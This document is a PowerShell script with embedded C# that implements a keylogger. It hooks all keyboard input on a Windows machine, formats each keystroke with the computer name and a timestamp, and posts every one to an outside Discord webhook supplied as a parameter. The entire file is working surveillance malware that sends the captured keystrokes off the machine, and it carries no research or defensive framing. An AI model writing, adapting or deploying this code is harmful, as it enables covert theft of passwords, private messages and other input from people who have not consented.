param (
    [string]$-webhook
)

if (-not $webhook) {
    Write-Host "No webhook provided. Exiting."
    exit
}

$pcName = $env:COMPUTERNAME  # Get PC name

# Define key replacements for special keys
$specialKeys = @{
    "RETURN" = "[ENTER]"
    "SPACE" = "[SPACE]"
    "BACK" = "[BACKSPACE]"
    "TAB" = "[TAB]"
    "CAPITAL" = "[CAPS_LOCK]"
    "SHIFTKEY" = "[SHIFT]"
    "CONTROLKEY" = "[CTRL]"
    "MENU" = "[ALT]"
    "ESCAPE" = "[ESC]"
    "LEFT" = "[LEFT_ARROW]"
    "RIGHT" = "[RIGHT_ARROW]"
    "UP" = "[UP_ARROW]"
    "DOWN" = "[DOWN_ARROW]"
    "DELETE" = "[DEL]"
    "INSERT" = "[INSERT]"
    "HOME" = "[HOME]"
    "END" = "[END]"
    "ADD" = "[PLUS]"
    "SUBTRACT" = "[MINUS]"
    "MULTIPLY" = "[STAR]"
    "DIVIDE" = "[SLASH]"
    "OEM_1" = "[SEMICOLON]"
    "OEM_PLUS" = "[EQUAL]"
    "OEM_COMMA" = "[COMMA]"
    "OEM_MINUS" = "[DASH]"
    "OEM_PERIOD" = "[DOT]"
    "OEM_2" = "[FORWARD_SLASH]"
    "OEM_3" = "[TILDE]"
    "OEM_4" = "[LEFT_BRACKET]"
    "OEM_5" = "[BACKSLASH]"
    "OEM_6" = "[RIGHT_BRACKET]"
    "OEM_7" = "[QUOTE]"
}

# Create keyboard hook
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class KeyboardHook {
    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callback, IntPtr hInstance, uint threadId);
    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hInstance);
    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hHook, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    public static event Action<string> OnKeyPressed;

    public static void Start() {
        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule) {
            return SetWindowsHookEx(13, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0) {
            int vkCode = Marshal.ReadInt32(lParam);
            string key = ((Keys)vkCode).ToString();
            OnKeyPressed?.Invoke(key);
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }
}
"@ -Language CSharp

# Function to send each keystroke to Discord
function Send-KeyToDiscord {
    param ([string]$key)
    
    $time = Get-Date -Format "HH:mm:ss"  # Get current time
    $formattedKey = if ($specialKeys.ContainsKey($key)) { $specialKeys[$key] } else { $key }
    $message = "[$pcName] - [$time] : $formattedKey"

    $json = @{content=$message} | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $json
}

# Attach event to send keylogs
[KeyboardHook]::OnKeyPressed = { param ($key) Send-KeyToDiscord $key }
[KeyboardHook]::Start() | Out-Null
